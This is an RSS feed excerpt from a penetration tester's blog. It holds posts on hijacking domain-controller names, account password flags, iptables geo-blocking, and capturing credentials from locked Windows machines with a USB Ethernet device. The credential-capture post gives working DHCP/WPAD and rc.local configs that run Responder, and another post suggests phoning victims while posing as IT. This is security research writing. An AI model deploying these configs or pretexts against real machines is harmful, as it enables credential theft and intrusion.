C:\WINDOWS\System32\Wbem
C:\WINDOWS\System32\WindowsPowerShell\v1.0\
C:\Program Files (x86)\Git\cmd
C:\WINDOWS\system32\config\systemprofile\.dnx\bin
C:\Program Files\Microsoft DNX\Dnvm\
C:\Program Files\Microsoft SQL Server\120\Tools\Binn\
C:\Program Files (x86)\Windows Kits\10\Windows Performance Toolkit\
C:\Program Files (x86)\nodejs\
C:\Users\andarno\.dnx\runtimes\dnx-clr-win-x86.1.0.0-beta7-12328\bin
C:\Users\andarno\.dnx\bin
c:\users\andarno\tools
C:\Users\andarno\AppData\Local\Code\bin
C:\ProgramData\chocolatey\bin
C:\Users\andarno\AppData\Roaming\npm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Anyone who has ever done &lt;a href=&#34;https://sensepost.com/blog/2016/rattleridentifying-and-exploiting-dll-preloading-vulnerabilities/&#34;&gt;DLL hijacking / preloading&lt;/a&gt; will see a lot of opportunities in a PATH variable this gigantic.&lt;/p&gt;

&lt;p&gt;There is a lot more fun to be had in similar output pasted across the Internet but lets get back to our regularly scheduled blog post. Here is the juice:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;LOGONSERVER = \\CO1-RED-DC-11
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This probably means that 01, 02, and so on exist as well, but I decided just to go with a simple PoC and use the DC that I knew existed. After registering &lt;code&gt;c01-red-dc-11.com&lt;/code&gt;, almost immediately I started to get DNS requests:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ns1.co1-red-dc-11.com
wap.co1-red-dc-11.com
www.co1-red-dc-11.com
mail.co1-red-dc-11.com
m.co1-red-dc-11.com
co1-red-dc-11.com
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;ns1&lt;/code&gt; and &lt;code&gt;www&lt;/code&gt; were mostly just Internet scanners, but I did see a bunch of interesting requests&lt;/p&gt;

&lt;h4 id=&#34;mail-co1-red-dc-11-com&#34;&gt;mail.co1-red-dc-11.com&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;101 total queries in the first 24 hours&lt;/li&gt;
&lt;li&gt;27 unique servers querying&lt;/li&gt;
&lt;li&gt;Query types: A/AAAA/ANY/CNAME/MX/NS/SOA/TXT&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;m-co1-red-dc-11-com&#34;&gt;m.co1-red-dc-11.com&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;1 total query in the first 24 hours&lt;/li&gt;
&lt;li&gt;1 unique servers querying&lt;/li&gt;
&lt;li&gt;Query types: A&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;co1-red-dc-11-com&#34;&gt;co1-red-dc-11.com&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;1841 total queries in the first 24 hours&lt;/li&gt;
&lt;li&gt;777 unique servers querying&lt;/li&gt;
&lt;li&gt;Query types: A/A6/AAAA/ANY/CNAME/DNSKEY/HINFO/MX/NAPTR/NS/PTR/SOA/SPF/SRV/TXT&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I have no idea if any of these DNS requests were by real Microsoft domain joined systems but looking at the contents of the requests I assume that a few were.&lt;/p&gt;

&lt;h2 id=&#34;analysis&#34;&gt;Analysis&lt;/h2&gt;

&lt;p&gt;I did this with a few other &lt;code&gt;%LOGONSERVER%&lt;/code&gt;s and had similar DNS requests. I didn&amp;rsquo;t see many packets coming in over SMB/445 because most places where a user would be away from their domain block 445 outbound. I tested out obtaining code execution in my LAB domain &lt;code&gt;SITTINGDUCK.INFO&lt;/code&gt; and actually had to set up a VPN to a VPS just so that my lab victim could make 445 requests to the Internet.&lt;/p&gt;

&lt;p&gt;In my lab I was able to get authentication requests and code execution by using Impacket&amp;rsquo;s &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/karmaSMB.py&#34;&gt;karmaSMB.py&lt;/a&gt; to send my victim a false &lt;code&gt;Logon.bat&lt;/code&gt; very similar to the setup for &lt;a href=&#34;https://www.coresecurity.com/blog/ms15-011-microsoft-windows-group-policy-real-exploitation-via-a-smb-mitm-attack&#34;&gt;MS15-011&lt;/a&gt;. Let me reiterate something:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;I DID NOT ATTEMPT ANYTHING MORE THAN LOGGING AGAINST ANY OF THE DOMAINS I REGISTERED FOR THIS RESEARCH&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Is this conclusive proof?&lt;/strong&gt; Certainly not, but it&amp;rsquo;s a start and I&amp;rsquo;m interested in what ya&amp;rsquo;ll find.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Why might this work more than it has in the past?&lt;/strong&gt; Because the only scenario where this is effective is when a Windows domain-joined machine has logged in to their real domain, and without logging out or shutting down (hibernate, or sleep are fine), is then connected to a network that allows 445 outbound. This is definitely becoming more commonplace as Windows becomes more friendly to actually successfully coming back from sleeping or hibernating (yes I&amp;rsquo;m bitter ;), it was actually my primary reason for buying a Mac).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How can you find the LOGONSERVER of your client?&lt;/strong&gt; Well, it&amp;rsquo;s pretty easy to call someone up, pretend to be IT, and simply ask them what Domain Controller they are connected to ;-). Or.. if you are lucky you can find it pasted somewhere online.&lt;/p&gt;

&lt;h2 id=&#34;one-more-thing&#34;&gt;One More Thing&amp;hellip;&lt;/h2&gt;

&lt;p&gt;I also tried to think in generalities, and yes, I am the proud owner of &lt;code&gt;DC01.com&lt;/code&gt; which gets about 20 requests per second&amp;hellip;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;::evil laugh::&lt;/strong&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Start in Infosec</title>
      <link>https://malicious.link/start/</link>
      <pubDate>Wed, 28 Dec 2016 15:00:00 -0400</pubDate>
      
      <guid>https://malicious.link/start/</guid>
      <description>&lt;p&gt;Instead of making yet another post about how to start in information security I have put together a collection of all the ones that people have done before. Right now this is a raw list, but I will go through and read each one. Once that is done, I&amp;rsquo;ll supply a review of each of them in this list.&lt;/p&gt;

&lt;p&gt;Want to add to this list? Make a comment on the GIST post here:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://gist.github.com/mubix/5737a066c8845d25721ec4bf3139fd31&#34;&gt;https://gist.github.com/mubix/5737a066c8845d25721ec4bf3139fd31&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Another Git repository:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/gradiuscypher/infosec_getting_started/blob/master/how_to_start/README.md&#34;&gt;https://github.com/gradiuscypher/infosec_getting_started/blob/master/how_to_start/README.md&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;script src=&#34;//gist.github.com/mubix/5737a066c8845d25721ec4bf3139fd31.js&#34;&gt;&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>Projects</title>
      <link>https://malicious.link/projects/</link>
      <pubDate>Tue, 27 Dec 2016 15:00:00 -0400</pubDate>
      
      <guid>https://malicious.link/projects/</guid>
      <description>

&lt;p&gt;The following is a list of projects that I have started on Github, a description of each and links to the blog posts, source code and binaries where applicable.&lt;/p&gt;

&lt;h2 id=&#34;attacker-knowledge-base&#34;&gt;Attacker Knowledge Base&lt;/h2&gt;

&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;

&lt;p&gt;Attacker Knowledge Base is a personal public wiki. I try to commit to it whenever I figure something new out or want to replicate something. You can usually find things on here before I have a fully formed.&lt;/p&gt;

&lt;h3 id=&#34;site&#34;&gt;Site&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://attackerkb.com&#34;&gt;https://attackerkb.com&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;source&#34;&gt;Source&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/mubix/akb&#34;&gt;https://github.com/mubix/akb&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;common-findings-database&#34;&gt;Common Findings Database&lt;/h2&gt;

&lt;h3 id=&#34;description-1&#34;&gt;Description&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Last updated: 05/26/2016&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;A public copy of findings for the community. The hope is that by writing them up publicly a peer review would happen to any findings submitted and others from the community would contribute.&lt;/p&gt;

&lt;h3 id=&#34;site-1&#34;&gt;Site&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://cfdb.io/&#34;&gt;https://cfdb.io/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;source-1&#34;&gt;Source&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/mubix/cfdb&#34;&gt;https://github.com/mubix/cfdb&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;ntlmv1des&#34;&gt;ntlmv1des&lt;/h2&gt;

&lt;h2 id=&#34;whitechapel-ng&#34;&gt;WhiteChapel-NG&lt;/h2&gt;

&lt;h2 id=&#34;shellshocker-pocs&#34;&gt;Shellshocker PoCs&lt;/h2&gt;

&lt;h2 id=&#34;whitechapel&#34;&gt;WhiteChapel&lt;/h2&gt;

&lt;h2 id=&#34;vtnotify&#34;&gt;vtnotify&lt;/h2&gt;

&lt;h2 id=&#34;netview&#34;&gt;NetView&lt;/h2&gt;

&lt;h2 id=&#34;ditto&#34;&gt;Ditto&lt;/h2&gt;

&lt;h3 id=&#34;description-2&#34;&gt;Description&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Last updated: 08/30/2015&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Ditto is a binary that steals the icon and information resources of a specified binary and it writes it onto a target binary.&lt;/p&gt;

&lt;h3 id=&#34;blog-post&#34;&gt;Blog Post&lt;/h3&gt;

&lt;p&gt;-&lt;/p&gt;

&lt;h3 id=&#34;release&#34;&gt;Release&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://room362.com/projects/ditto_noicon.exe&#34;&gt;https://room362.com/projects/ditto_noicon.exe&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://room362.com/projects/ditto_withicon.exe&#34;&gt;https://room362.com/projects/ditto_withicon.exe&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;source-2&#34;&gt;Source&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/mubix/ditto&#34;&gt;https://github.com/mubix/ditto&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;portals&#34;&gt;Portals&lt;/h2&gt;

&lt;h2 id=&#34;power-exploitation-wiki&#34;&gt;Power Exploitation Wiki&lt;/h2&gt;

&lt;h2 id=&#34;metasploit-wiki&#34;&gt;Metasploit Wiki&lt;/h2&gt;

&lt;h2 id=&#34;meterpy&#34;&gt;Meterpy&lt;/h2&gt;

&lt;h2 id=&#34;twitterfriendsopml&#34;&gt;TwitterFriendsOPML&lt;/h2&gt;

&lt;h2 id=&#34;deepmagic&#34;&gt;DeepMagic&lt;/h2&gt;

&lt;h2 id=&#34;watchmen&#34;&gt;Watchmen&lt;/h2&gt;

&lt;h2 id=&#34;resolvequick&#34;&gt;resolvequick&lt;/h2&gt;

&lt;h2 id=&#34;deletethattweet&#34;&gt;DeleteThatTweet&lt;/h2&gt;

&lt;h2 id=&#34;disappeared&#34;&gt;disappeared&lt;/h2&gt;

&lt;h2 id=&#34;fakenetbios&#34;&gt;FakeNetBIOS&lt;/h2&gt;

&lt;h3 id=&#34;description-3&#34;&gt;Description&lt;/h3&gt;

&lt;p&gt;This is a copy of the FakeNetBIOS code that originally was written by Patrick Chambet but seemed to disappear from the Internet. I used this tool on pentests and wanted it preserved so I posted it on Github.&lt;/p&gt;

&lt;p&gt;What does it do? Well it responds to NetBIOS requests just like Responder does but on a Windows host. There is now a great powershell script that does this as well called &lt;a href=&#34;https://github.com/Kevin-Robertson/Inveigh&#34;&gt;Inveigh by Kevin Robertson &lt;/a&gt;. These binaries should still work if powershell isn&amp;rsquo;t available.&lt;/p&gt;

&lt;h3 id=&#34;release-1&#34;&gt;Release&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/mubix/FakeNetBIOS/tree/master/Win32&#34;&gt;https://github.com/mubix/FakeNetBIOS/tree/master/Win32&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;source-3&#34;&gt;Source&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/mubix/FakeNetBIOS&#34;&gt;https://github.com/mubix/FakeNetBIOS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Passwordreq No - A hacker prospective</title>
      <link>https://malicious.link/post/2016/passwordreq-no-a-hacker-prospective/</link>
      <pubDate>Wed, 07 Dec 2016 07:35:28 -0500</pubDate>
      
      <guid>https://malicious.link/post/2016/passwordreq-no-a-hacker-prospective/</guid>
      <description>&lt;p&gt;Ever have one of those topics that you know you&amp;rsquo;ve looked up 100 times but never can remember the answer?&lt;/p&gt;

&lt;p&gt;I was having one of those moments in a recent conversation on the NoVA Hackers mailing list (If you want to join &lt;a href=&#34;https://novahackers.blogspot.com/p/how-to-join-and-rules.html&#34;&gt;please read the instructions&lt;/a&gt; before &lt;a href=&#34;https://twitter.com/mubix/status/719726427785007104&#34;&gt;requesting to join&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;The question came up as to what effect &amp;ldquo;Password Required: No&amp;rdquo; means in a &lt;code&gt;net user UserName&lt;/code&gt; is.&lt;/p&gt;

&lt;p&gt;As usual, MSDN isn&amp;rsquo;t very helpful:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/passwordreq:{yes | no} - Specifies whether a user account must have a password. The default is yes.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;from: &lt;a href=&#34;https://technet.microsoft.com/en-us/library/cc771865%28v=ws.11%29.aspx&#34;&gt;https://technet.microsoft.com/en-us/library/cc771865%28v=ws.11%29.aspx&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;An old ISS finding wasn&amp;rsquo;t any more helpful:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;A User account has been detected with no password required. No password requirement allows attackers unauthorized access, including the ability to take over and replace processes, and access other computers on the network.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;from: &lt;a href=&#34;http://www.iss.net/security_center/reference/vulntemp/nt-usernopw.htm&#34;&gt;http://www.iss.net/security_center/reference/vulntemp/nt-usernopw.htm&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;But they did at least provide mitigations and remediation steps.&lt;/p&gt;

&lt;p&gt;Finally doing tests on a number of different scenarios I finally figured out what it meant in more concret terms:&lt;/p&gt;

&lt;p&gt;If the &lt;code&gt;passwordreq&lt;/code&gt; field is set on an account, the password &lt;strong&gt;CAN&lt;/strong&gt; be blank which essentially bypasses any password complexity requirements:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2016/passwordreq.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;In one specific case this actually makes things more secure:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2016/passwordreq2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;CIFS/SMB does not allow access to shares or IFS actions by default as per default computer/group policy. However, RDP, WinRM, and WMI work just fine.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Blocking countries via iptables</title>
      <link>https://malicious.link/post/2016/blocking-countries-via-iptables/</link>
      <pubDate>Fri, 28 Oct 2016 15:00:00 -0400</pubDate>
      
      <guid>https://malicious.link/post/2016/blocking-countries-via-iptables/</guid>
      <description>&lt;p&gt;With all of the scanning / noise on the Internet, it&amp;rsquo;s nice to get rid of a large chunk of it simply by blocking an entire country&amp;rsquo;s worth of IP space. To do that you can simply use a kernel module for iptables called &amp;ldquo;xtables-addons&amp;rdquo;. On Debian/Ubuntu it&amp;rsquo;s pretty easy to get going, just &lt;code&gt;apt-get&lt;/code&gt; install the needed perl library and the addons themselves:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;apt-get install libtext-csv-xs-perl xtables-addons-common
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;!Warning: This does require proper linux headers to be available to compile the kernel module. In the case of where these aren&amp;rsquo;t availabe (like Linode&amp;rsquo;s special kernel), you will need to find another way to get the correct headers installed.&lt;/p&gt;

&lt;p&gt;Then download the Maxmind geo database, the location of the &lt;code&gt;xt_geoip_dl&lt;/code&gt; tool that does this is dependent on the installed version of xtables-addons. For my testing I have found it in &lt;code&gt;/usr/src/xtables-addons-2.6/geoip/&lt;/code&gt; as well as &lt;code&gt;/usr/lib/xtables-addons/&lt;/code&gt; YMMV.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cd /usr/src/xtables-addons-2.6/geoip/
./xt_geoip_dl
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You should see it downloading the IP databases:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;--2016-10-28 13:55:24--  http://geolite.maxmind.com/download/geoip/database/GeoIPv6.csv.gz
Length: 1303811 (1.2M) [application/octet-stream]
Saving to: GeoIPv6.csv.gz

GeoIPv6.csv.gz                                  100%[=========================================================================================================&amp;gt;]   1.24M  --.-KB/s   in 0.004s

2016-10-28 13:55:24 (321 MB/s) - GeoIPv6.csv.gz saved [1303811/1303811]

--2016-10-28 13:55:24--  http://geolite.maxmind.com/download/geoip/database/GeoIPCountryCSV.zip
Saving to: GeoIPCountryCSV.zip

GeoIPCountryCSV.zip                             100%[=========================================================================================================&amp;gt;]   2.04M  --.-KB/s   in 0.006s

2016-10-28 13:55:24 (326 MB/s) - GeoIPCountryCSV.zip saved [2137625/2137625]

FINISHED --2016-10-28 13:55:24--
Total wall clock time: 0.1s
Downloaded: 2 files, 3.3M in 0.01s (324 MB/s)
Archive:  GeoIPCountryCSV.zip
  inflating: GeoIPCountryWhois.csv

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After that, you need to &amp;ldquo;build&amp;rdquo; the lists by performing the following command in that same directory (one install didn&amp;rsquo;t automatically make the directory so ensure it&amp;rsquo;s there with the mkdir command):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mkdir -p /usr/share/xt_geoip
./xt_geoip_build -D /usr/share/xt_geoip *.csv
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After that you are off the the races and you can simply use the geoip module as so now:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;iptables -A INPUT -m geoip --src-cc CN -j DROP
iptables -A INPUT -m geoip --src-cc HK -j DROP
iptables -A INPUT -m geoip --src-cc RU -j DROP
iptables -A INPUT -m geoip --src-cc KR -j DROP
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Or you can go the other route and just allow from your country:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;iptables -A INPUT -m geoip --src-cc PL -m tcp -p tcp --dport 22 -j ACCEPT
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When looking up how to do this many people recommended updating the GeoIP database once a month. To do this I made a really simple bash script that just repeats all the things I did and added it to a monthly cron job:&lt;/p&gt;

&lt;p&gt;File: 0update_maxmind&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/bin/bash

rm -f /usr/src/xtables-addons-2.6/geoip/*.csv
rm -rf /usr/share/xt_geoip/*
cd /usr/src/xtables-addons-2.6/geoip/
./xt_geoip_dl
./xt_geoip_build -D /usr/share/xt_geoip *.csv
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Setting the cronjob:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;chmod +x 0update_maxmind
mv 0update_maxmind /etc/cront.monthly/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;References I found useful:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://xtables-addons.sourceforge.net/geoip.php&#34;&gt;http://xtables-addons.sourceforge.net/geoip.php&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.internetstaff.com/frustrate-ssh-scanners-geoip-iptables-blocking/&#34;&gt;https://www.internetstaff.com/frustrate-ssh-scanners-geoip-iptables-blocking/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.linode.com/stackscripts/view/3807-jeffkyjin-ipp2p+filtering&#34;&gt;https://www.linode.com/stackscripts/view/3807-jeffkyjin-ipp2p+filtering&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Snagging creds from locked machines</title>
      <link>https://malicious.link/post/2016/snagging-creds-from-locked-machines/</link>
      <pubDate>Tue, 06 Sep 2016 07:35:28 -0500</pubDate>
      
      <guid>https://malicious.link/post/2016/snagging-creds-from-locked-machines/</guid>
      <description>

&lt;p&gt;First off, this is dead simple and shouldn&amp;rsquo;t work, but it does. Also, there is no possible way that I&amp;rsquo;m the first one that has identified this, but here it is (&lt;strong&gt;trust me, I tested it so many ways to confirm it because I couldn&amp;rsquo;t believe it was true&lt;/strong&gt;)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt; USB Ethernet + DHCP + Responder == Creds&lt;/p&gt;

&lt;h1 id=&#34;thesis&#34;&gt;Thesis:&lt;/h1&gt;

&lt;p&gt;If I plug in a device that masquerades as a USB Ethernet adapter and has a computer on the other end, can I capture credentials from a system, even when locked out (yes, logged in, just locked). (..or do even more, but we&amp;rsquo;ll save that for another time, this post is already too long)&lt;/p&gt;

&lt;h2 id=&#34;device-setup&#34;&gt;Device Setup&lt;/h2&gt;

&lt;p&gt;I started off with a &lt;a href=&#34;https://inversepath.com/usbarmory&#34;&gt;USB Armory&lt;/a&gt; ($155) but below I&amp;rsquo;ll show you how to do this with a &lt;a href=&#34;http://hakshop.myshopify.com/collections/lan-turtle/products/lan-turtle&#34;&gt;Hak5 Turtle&lt;/a&gt; ($49.99) as well.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ll leave the setting up of the base device itself to you, but here are some links that can start you on your way:&lt;/p&gt;

&lt;h3 id=&#34;usb-armory&#34;&gt;USB Armory&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Debian/Jessie - &lt;a href=&#34;https://github.com/inversepath/usbarmory/wiki/Starting#preparing-your-own-microsd-card&#34;&gt;https://github.com/inversepath/usbarmory/wiki/Starting#preparing-your-own-microsd-card&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Kali on USB Armory - &lt;a href=&#34;http://docs.kali.org/kali-on-arm/kali-linux-on-usb-armory&#34;&gt;http://docs.kali.org/kali-on-arm/kali-linux-on-usb-armory&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Resizing the SD partition - &lt;a href=&#34;http://base16.io/?p=61&#34;&gt;http://base16.io/?p=61&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;hak5-turtle&#34;&gt;Hak5 Turtle&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Turtle video guides and wiki: &lt;a href=&#34;https://lanturtle.com/wiki/#!videos.md&#34;&gt;https://lanturtle.com/wiki/#!videos.md&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;tools&#34;&gt;Tools&lt;/h2&gt;

&lt;p&gt;Basically the capturing is done with &lt;a href=&#34;https://twitter.com/pythonresponder&#34;&gt;Laurent Gaffi&amp;rsquo;s&lt;/a&gt; &lt;a href=&#34;https://github.com/lgandx/Responder&#34;&gt;Responder&lt;/a&gt; so you need to find a way to get Responder onto the device. The Hak5 Turtle already has a module for it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2016/turtleshell.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;You do have to &amp;ldquo;Enable&amp;rdquo; the module for the first time (plugged into Internet access) to get it to actually download all of dependencies and package itself.&lt;/p&gt;

&lt;p&gt;Then you also need to do a &lt;code&gt;opkg update&lt;/code&gt; and &lt;code&gt;opkg install python-openssl&lt;/code&gt; so that Responder will run correctly. This is only a temporary issue as the module is being fixed to include this step.&lt;/p&gt;

&lt;p&gt;As for the USB Armory is you can either use SCP, Internet Connection Sharing, the USB host/client adapter:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2016/usbarmory_host_adapter.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The default install of Debian/Jessie doesn&amp;rsquo;t have Python installed so you will have to work through all of the dependencies (on the Kali version this is not needed) and will require Internet access to perform:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;apt-get install -y python git python-pip python-dev screen sqlite3
pip install pycrypto
git clone https://github.com/spiderlabs/responder
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;configuration&#34;&gt;Configuration&lt;/h2&gt;

&lt;h3 id=&#34;armory&#34;&gt;Armory&lt;/h3&gt;

&lt;p&gt;First, setting up the interface isn&amp;rsquo;t needed but it will help with consistence since each image for the Armory come with different default IP addresses and it&amp;rsquo;s good to set a solid base.&lt;/p&gt;

&lt;h4 id=&#34;etc-network-interfaces&#34;&gt;/etc/network/interfaces&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;# interfaces(5) file used by ifup(8) and ifdown(8)
# Include files from /etc/network/interfaces.d:
source-directory /etc/network/interfaces.d
auto usb0
allow-hotplug usb0
iface usb0 inet static
  address 192.168.2.201
  netmask 255.255.255.0
  gateway 192.168.2.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next we set up the DHCP server:&lt;/p&gt;

&lt;h4 id=&#34;etc-dhcp-dhcpd-conf&#34;&gt;/etc/dhcp/dhcpd.conf&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;ddns-update-style none;

option domain-name &amp;quot;domain.local&amp;quot;;
option domain-name-servers 192.168.2.201;

default-lease-time 60;
max-lease-time 72;

# If this DHCP server is the official DHCP server for the local
# network, the authoritative directive should be uncommented.
authoritative;

# Use this to send dhcp log messages to a different log file (you also
# have to hack syslog.conf to complete the redirection).
log-facility local7;

# wpad
option local-proxy-config code 252 = text;

# A slightly different configuration for an internal subnet.
subnet 192.168.2.0 netmask 255.255.255.0 {
  range 192.168.2.1 192.168.2.2;
  option routers 192.168.2.201;
  option local-proxy-config &amp;quot;http://192.168.2.201/wpad.dat&amp;quot;;
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The only special configuration here is to send the &amp;ldquo;Proxy Config&amp;rdquo; option to any DHCP clients. Why this is even a thing I have no idea, but note this line:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&amp;ldquo;DHCP has a higher priority than DNS: if DHCP provides the WPAD URL, no DNS lookup is performed.&amp;rdquo;&lt;/strong&gt; from &lt;a href=&#34;https://en.wikipedia.org/wiki/Web_Proxy_Autodiscovery_Protocol&#34;&gt;the Wikipedia article on WPAD&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Next we set up things to automatically run. We edit the &lt;code&gt;rc.local&lt;/code&gt; file so that it does a few things:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Clears out all DHCP leases and start the DHCP server&lt;/strong&gt;. There is probably a more elegant way to do this, but because this &amp;ldquo;computer&amp;rdquo; is being plugged in and taken out pretty frequently, we could run into a max in leases but most likely the file will get corrupted at some point so we just remove and re-add it.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Start Responder in a screen session&lt;/strong&gt;. This way we can get logging going on the screen session as a sort of backup for the Sqlite3 database and log files that Responder creates.&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;etc-rc-local&#34;&gt;/etc/rc.local&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#!/bin/sh -e

# Clear leases
rm -f /var/lib/dhcp/dhcpd.leases
touch /var/lib/dhcp/dhcpd.leases

# Start DHCP server
/usr/sbin/dhcpd

# Start Responder
/usr/bin/screen -dmS responder bash -c &#39;cd /root/responder/; python Responder.py -I usb0 -f -w -r -d -F&#39;

exit 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To enable logging of the screen sessions (which also gives you insight into if anything went wrong), you add a &lt;code&gt;.screenrc&lt;/code&gt; file. There is a lot more that I put in these, mostly for aesthetics but the important pieces are these:&lt;/p&gt;

&lt;h4 id=&#34;root-screenrc&#34;&gt;/root/.screenrc&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;# Logging
deflog on
logfile /root/logs/screenlog_$USER_.%H.%n.%Y%m%d-%0c:%s.%t.log
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That&amp;rsquo;s it, you should be able to reboot your USB Armory and start picking up creds anywhere you can stick a USB in.&lt;/p&gt;

&lt;h3 id=&#34;hak5-turtle-1&#34;&gt;Hak5 Turtle&lt;/h3&gt;

&lt;p&gt;Everything is pretty much already done for you, the only difference is that opkg is your package manager:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;opkg update
opkg install python-openssl screen
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Remove the symlink to /tmp/ so that the logs will stick around&lt;/p&gt;

